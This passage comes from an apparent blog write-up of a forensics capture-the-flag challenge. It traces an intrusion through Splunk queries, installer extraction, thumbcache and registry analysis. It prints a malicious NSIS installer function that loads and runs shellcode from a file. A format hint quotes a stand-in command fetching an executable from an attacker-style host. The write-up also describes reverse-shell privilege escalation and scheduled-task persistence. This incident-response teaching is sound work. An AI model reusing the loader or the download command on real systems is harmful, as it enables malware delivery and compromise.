+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>Besides the credential dumper executable, there’s another uploaded malicious file that has a capability to exploit the Windows Access Token Privilege. What’s this file’s name on the victim’s machine? Please do provide the answer in form of full path!</p>
+<p>💡 Format: C:\Malware\tokenhijack.exe</p>
+</blockquote>
+<p>We can try to find the executable by using our Security logs and finding executables that modified any token privileges and is stored in <code>C:\h1dd3n\</code>.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>index="cj2025_mephisto" source="security.json" Event.System.EventID="4703" Event.EventData.ProcessName="C:\\h1dd3n\\*"</span></span>
+<span class="line"><span>| table Event.EventData.ProcessName</span></span></code></pre>
+<p><img src="/images/mephisto/mephisto_q15_1.png" alt=""></p>
+<p>We have two executables, but <code>sassy.exe</code> is our answer.</p>
+<p>Answer: <code>C:\h1dd3n\sassy.exe</code></p>
+<h4 id="question-16">Question 16</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>What is the created named pipe from the prior/similar executable that is used to perform a privilege escalation that led to a successful reverse shell with NT Authority Context? Provide the full pipe name!</p>
+<p>💡 Format: \12345678-abcd-1234-ef00-123456789abc\pipe\winreg</p>
+</blockquote>
+<p>We can use Splunk magic to see the process IDs of <code>sassy.exe</code> that created a pipe, then correlating them to the commands that is being ran by that process.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>index="cj2025_mephisto" source="sysmon.json" Event.System.EventID="1" </span></span>
+<span class="line"><span>| join left=L right=R where L.Event.EventData.ParentProcessId=R.Event.EventData.ProcessId </span></span>
+<span class="line"><span>    [ search index="cj2025_mephisto" source="sysmon.json" Event.System.EventID="17" Event.EventData.Image="*sassy.exe*"] </span></span>
+<span class="line"><span>| table L.Event.EventData.CurrentDirectory, L.Event.EventData.ParentCommandLine, R.Event.EventData.PipeName</span></span></code></pre>
+<p><img src="/images/mephisto/mephisto_q16_1.png" alt=""></p>
+<p>We will see that the top row is the event that we are looking for.</p>
+<p>Answer: <code>\85985985-ddfa-430b-bf04-fc33fcfdc881\pipe\epmapper</code></p>
+<h4 id="question-17">Question 17</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>The prior reverse shell is leveraged from a known executable listener but the name is also modified in the victim’s machine. What’s the name of the changed file’s name? Please do provide the answer in form of full path!</p>
+<p>💡 Format: C:\Tools\listener.exe</p>
+</blockquote>
+<p>From the previous screenshot, we can see the full path of the listener is <code>C:\h1dd3n\kucing.exe</code>.</p>
+<p>Answer: <code>C:\h1dd3n\kucing.exe</code></p>
+<h3 id="episode-iii-and-i-am-giving-you-the-new-devil">Episode III: And I am Giving You the New Devil</h3>
+<h4 id="question-18">Question 18</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>Let’s recall back to our point zero where the compromises begins. Our focus now is on the installer and the dropped files. By looking back the question to HOW can the attacker compromise the victims’ device, you have to reverse engineer them as there might be a hidden shellcode placed inside those. Please do provide the MD5 of the shellcode!</p>
+<p>💡 Format: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6</p>
+</blockquote>
+<p>When using Detect-It-Easy on the <code>AnsiArtInstaller.exe</code> file, we can see that this executable is a Nullsoft installer.</p>
+<p><img src="/images/mephisto/mephisto_q18_1.png" alt=""></p>
+<p>Nullsoft installers uses a <code>.nsi</code> script as the main script to dictate how will the installer installs the software to the system. To extract this script, we need a <a href="https://github.com/myfreeer/7z-build-nsis">special 7Zip version</a> that allows the extraction of the NSIS script. But before extracting, we need to rename the installer to use the <code>.nsis</code> extension to allow 7Zip to recognise the file and extract it properly.</p>
+<p>After extraction we will get all of the packaged files, including the NSIS script.</p>
+<p><img src="/images/mephisto/mephisto_q18_2.png" alt=""></p>
+<p>The NSIS script contains a lot, but we will focus on the part where it loads the shellcode.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Function .onInit</span></span>
+<span class="line"><span>  StrCpy $INSTDIR $TEMP</span></span>
+<span class="line"><span>  SetOutPath $INSTDIR</span></span>
+<span class="line"><span>  IfFileExists $INSTDIR\program.banner label_11 label_7</span></span>
+<span class="line"><span>label_7:</span></span>
+<span class="line"><span>  File program.banner</span></span>
+<span class="line"><span>  File ansi_art.exe</span></span>
+<span class="line"><span>  CreateShortCut $DESKTOP\AnsiArt.lnk $INSTDIR\ansi_art.exe</span></span>
+<span class="line"><span>  Exec $INSTDIR\ansi_art.exe</span></span>
+<span class="line"><span>label_11:</span></span>
+<span class="line"><span>  StrCpy $4 $INSTDIR\program.banner</span></span>
+<span class="line"><span>  System::Call "KERNEL32::_lopen(m r4, i 0x2)i.r6"</span></span>
+<span class="line"><span>    ; Call func_39</span></span>
+<span class="line"><span>    ; SetOverwrite off</span></span>
+<span class="line"><span>    ; File $PLUGINSDIR\System.dll</span></span>
+<span class="line"><span>    ; SetDetailsPrint lastused ; !!!! Unknown Params:  Dir "" ProgramFilesDir $(LSTR_0)   ; 13 0 1 -1    ;  "Nullsoft Install System v3.11"</span></span>
+<span class="line"><span>    ; Push "KERNEL32::_lopen(m r4, i 0x2)i.r6"</span></span>
+<span class="line"><span>    ; CallInstDLL $PLUGINSDIR\System.dll Call</span></span>
+<span class="line"><span>  System::Call "KERNEL32::VirtualAlloc(i 0, i 0x1000, i 0x3000, i 0x40)p.r7"</span></span>
+<span class="line"><span>    ; Call func_39</span></span>
+<span class="line"><span>    ; AllowSkipFiles off</span></span>
+<span class="line"><span>    ; File $PLUGINSDIR\System.dll</span></span>
+<span class="line"><span>    ; SetDetailsPrint lastused ; !!!! Unknown Params:  Dir "" ProgramFilesDir $(LSTR_0)   ; 13 0 1 -1    ;  "Nullsoft Install System v3.11"</span></span>
+<span class="line"><span>    ; Push "KERNEL32::VirtualAlloc(i 0, i 0x1000, i 0x3000, i 0x40)p.r7"</span></span>
+<span class="line"><span>    ; CallInstDLL $PLUGINSDIR\System.dll Call</span></span>
+<span class="line"><span>  System::Call "KERNEL32::_lread(i r6, p r7, i 0x1000)i.r8"</span></span>
+<span class="line"><span>    ; Call func_39</span></span>
+<span class="line"><span>    ; File $PLUGINSDIR\System.dll</span></span>
+<span class="line"><span>    ; SetDetailsPrint lastused ; !!!! Unknown Params:  Dir "" ProgramFilesDir $(LSTR_0)   ; 13 0 1 -1    ;  "Nullsoft Install System v3.11"</span></span>
+<span class="line"><span>    ; Push "KERNEL32::_lread(i r6, p r7, i 0x1000)i.r8"</span></span>
+<span class="line"><span>    ; CallInstDLL $PLUGINSDIR\System.dll Call</span></span>
+<span class="line"><span>  System::Call "KERNEL32::_lclose(i r6)"</span></span>
+<span class="line"><span>    ; Call func_39</span></span>
+<span class="line"><span>    ; File $PLUGINSDIR\System.dll</span></span>
+<span class="line"><span>    ; SetDetailsPrint lastused ; !!!! Unknown Params:  Dir "" ProgramFilesDir $(LSTR_0)   ; 13 0 1 -1    ;  "Nullsoft Install System v3.11"</span></span>
+<span class="line"><span>    ; Push "KERNEL32::_lclose(i r6)"</span></span>
+<span class="line"><span>    ; CallInstDLL $PLUGINSDIR\System.dll Call</span></span>
+<span class="line"><span>  IntOp $9 $7 + 1337</span></span>
+<span class="line"><span>  System::Call ::$9</span></span>
+<span class="line"><span>    ; Call func_39</span></span>
+<span class="line"><span>    ; File $PLUGINSDIR\System.dll</span></span>
+<span class="line"><span>    ; SetDetailsPrint lastused ; !!!! Unknown Params:  Dir "" ProgramFilesDir $(LSTR_0)   ; 13 0 1 -1    ;  "Nullsoft Install System v3.11"</span></span>
+<span class="line"><span>    ; Push ::$9</span></span>
+<span class="line"><span>    ; CallInstDLL $PLUGINSDIR\System.dll Call</span></span>
+<span class="line"><span>FunctionEnd</span></span></code></pre>
+<p>We can see a chain of KERNEL32 APIs being called that is usually used to load and execute shellcode. The first thing the installer did is to copy the <code>program.banner</code> path to <code>$4</code>/<code>r4</code>. Then, it will call <code>_lopen</code> that will open <code>program.banner</code> and stores the file handle to <code>r6</code>. After that, it will allocate memory of size <code>0x1000</code> and stores the pointer to <code>r7</code>. The installer will then read the <code>program.banner</code> and stores the first <code>0x1000</code> bytes to the allocated memory. After closing the <code>program.banner</code> handle, it will store the pointer of the memory added by <code>1337</code> to <code>$9</code>. Lastly, the installer will call <code>$9</code> hence running the shellcode.</p>
+<p>We can conclude that the shellcode is stored inside the <code>program.banner</code> file with offset of <code>1337</code>. We can use tools like <code>dd</code> to extract the shellcode and then use <code>md5sum</code> calculate the MD5 checksum of the shellcode.</p>
+<p>Answer: <code>1bc45ea74b3582d815e9cdfb46bed530</code></p>
+<h4 id="question-19">Question 19</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>It looks like this malware campaign has been around 2019-2022. Are you able to perform complete extraction of the embedded pre-executed script inside the malicious file? NOTE THAT this script is readable, and for the POC, first please do provide us what’s the full strings content of func_2 message?</p>
+<p>💡 Format: Welcome to the dark side, hacker!</p>
+</blockquote>
+<p>We can just extract it from the previously mentioned NSIS script.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Function func_2</span></span>
+<span class="line"><span>  MessageBox MB_OK "Enjoy your game, sincerely from APT!"</span></span>
+<span class="line"><span>FunctionEnd</span></span></code></pre>
+<p>Answer: <code>Enjoy your game, sincerely from APT!</code></p>
+<h4 id="question-20">Question 20</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>Still referring from the question before, what’s the responsible function name that performs the malicious action?</p>
+<p>💡 Format: Rajag4t4B</p>
+</blockquote>
+<p>This refers to the function name from question 18.</p>
+<p>Answer: <code>.onInit</code></p>
+<h4 id="question-21">Question 21</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>Again, still referring from the question before, since you’ve spotted the function that does the malicious shellcode execution, please do provide the last 2 lines of code BEFORE the end of the function delimited by underscore!</p>
+<p>For example, you found this function:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>def evil(x):</span></span>
+<span class="line"><span>     a = [x,'1','2',...]</span></span>
+<span class="line"><span>     [SNIP]</span></span>
+<span class="line"><span>     m = "whoami"</span></span>
+<span class="line"><span>     system(m)</span></span></code></pre>
+<p>💡 Format: m = “whoami”_system(m)</p>
+</blockquote>
+<p>We can just use the last two lines from question 18 as the answer.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>  IntOp $9 $7 + 1337</span></span>
+<span class="line"><span>  System::Call ::$9</span></span>
+<span class="line"><span>    ; Call func_39</span></span>
+<span class="line"><span>    ; File $PLUGINSDIR\System.dll</span></span>
+<span class="line"><span>    ; SetDetailsPrint lastused ; !!!! Unknown Params:  Dir "" ProgramFilesDir $(LSTR_0)   ; 13 0 1 -1    ;  "Nullsoft Install System v3.11"</span></span>
+<span class="line"><span>    ; Push ::$9</span></span>
+<span class="line"><span>    ; CallInstDLL $PLUGINSDIR\System.dll Call</span></span>
+<span class="line"><span>FunctionEnd</span></span></code></pre>
+<p>Answer: <code>IntOp $9 $7 + 1337_System::Call ::$9</code></p>
+<h3 id="episode-iv-the-last-rites">Episode IV: The Last Rites</h3>
+<h4 id="question-22">Question 22</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>The attacker somehow managed to delete our internal documents securely. However, we believe that there’s a chance to recover it since it only has one page with big font related to the victim’s company vault code. Can you provide us the full strings content of it?</p>
+<p>Here’s the screenshotted overview of how we save it: <a href="https://drive.google.com/file/d/1cG5znJHGIB3exL09uNKfGzNptQX3Svxt/view?usp=sharing">https://drive.google.com/file/d/1cG5znJHGIB3exL09uNKfGzNptQX3Svxt/view?usp=sharing</a></p>
+<p>💡 Format: Ini Hanya Untuk Internal 99887766</p>
+</blockquote>
+<p>The given screenshot shows that the user is saving a file called <code>Dokumen Internal_Backupv2.docx</code>. To recover its thumbnail, we can go to <code>C:\Users\as3ng\AppData\Local\Microsoft\Windows\Explorer</code> and use Thumbcache Viewer to analyse the <code>thumbcache_*.db</code> files. We can find the thumbnail for this file at <code>thumbcache_768.db</code></p>
+<p><img src="/images/mephisto/mephisto_q22_1.png" alt=""></p>
+<p>Answer: <code>Kode Rahasia Brankas PT Dananrata 11111131</code></p>
+<h4 id="question-23">Question 23</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>It looks like the attacker creates a malicious persistence besides creating arbitrary user, making them to login as the Administrator as well. What’s the name of the executable that responsible to do so?</p>
+<p>💡 Format: persistence.exe</p>
+</blockquote>
+<p>We can go back to question 14 and use that query to see all the executables downloaded by the attacker and we have not analysed <code>gnarly.exe</code>. Let’s check any events that is related to this executable.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>index="cj2025_mephisto" source="sysmon.json" gnarly.exe</span></span></code></pre>
+<p>The first result gives us an event 13 that logs any value modifications of a registry key. Specifically, <code>gnarly.exe</code> is creating a new scheduled task, which can be used as a persistence mechanism.</p>
+<p><img src="/images/mephisto/mephisto_q23_1.png" alt=""></p>
+<p>Answer: <code>gnarly.exe</code></p>
+<h4 id="question-24">Question 24</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>What’s the scheduled task that is being targeted by this executable? Please do provide its URI.</p>
+<p>💡 Format: \Firefox\Maintainer</p>
+</blockquote>
+<p>For this question, we need to go to <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{C94D9178-DEA0-46DF-9A2D-4776C39E6964}</code> to get the name of the task. We can use tools like <code>regshell</code> to open <code>C:\Windows\System32\config\SOFTWARE</code> and find the scheduled task.</p>
+<p><img src="/images/mephisto/mephisto_q24_1.png" alt=""></p>
+<p>We can see the value of <code>URI</code> is <code>\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan</code>.</p>
+<p>Answer: <code>\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan</code></p>
+<h4 id="question-25">Question 25</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>What’s the full command of the overwritten scheduled task?</p>
+<p>💡 Format: D:\blataran\jamoer.exe —SilentInstall <a href="http://jagad.evil/badarawuhi.exe">http://jagad.evil/badarawuhi.exe</a>; sc query badarawuhi.exe</p>
+</blockquote>
+<p>We can get this from the <code>Actions</code> key from the previous registry query we did. The <code>Actions</code> key is Base64 encoded and can be decoded using tools like CyberChef.</p>
+<p><img src="/images/mephisto/mephisto_q25_1.png" alt=""></p>
+<p>After the <code>Author</code> string, we can see a <code>cmd.exe</code> string that indicates the command that will be used by the task.</p>
+<p>Answer: <code>cmd.exe /c C:\Users\Administrator\Downloads\AnsiArtInstaller.exe</code></p></div></article><aside class="toc" aria-label="On this page"><p>On this page</p><ol><li class="nested"><a href="#challenge-description">Challenge Description</a></li><li class="nested"><a href="#flag">Flag</a></li><li class="nested"><a href="#episode-i-the-responder-first-day">Episode I: The Responder First Day</a></li><li class="nested"><a href="#episode-ii-the-adversary-breadcrumbs">Episode II: The Adversary Breadcrumbs</a></li><li class="nested"><a href="#episode-iii-and-i-am-giving-you-the-new-devil">Episode III: And I am Giving You the New Devil</a></li><li class="nested"><a href="#episode-iv-the-last-rites">Episode IV: The Last Rites</a></li></ol></aside></main><footer class="site-footer"><div><span>k3ng.xyz</span><span class="footer-note">2026</span></div></footer><script>
+      document.querySelector('.theme-toggle')?.addEventListener('click', () => {
+        const theme = document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark';
+        const updateTheme = () => {
+          document.documentElement.dataset.theme = theme;
+          localStorage.setItem('theme', theme);
+        };
+
+        if (document.startViewTransition) {
+          document.startViewTransition(updateTheme);
+          return;
+        }
+
+        document.documentElement.classList.add('theme-transition');
+        updateTheme();
+        setTimeout(() => document.documentElement.classList.remove('theme-transition'), 650);
+      });
+    </script></body></html>
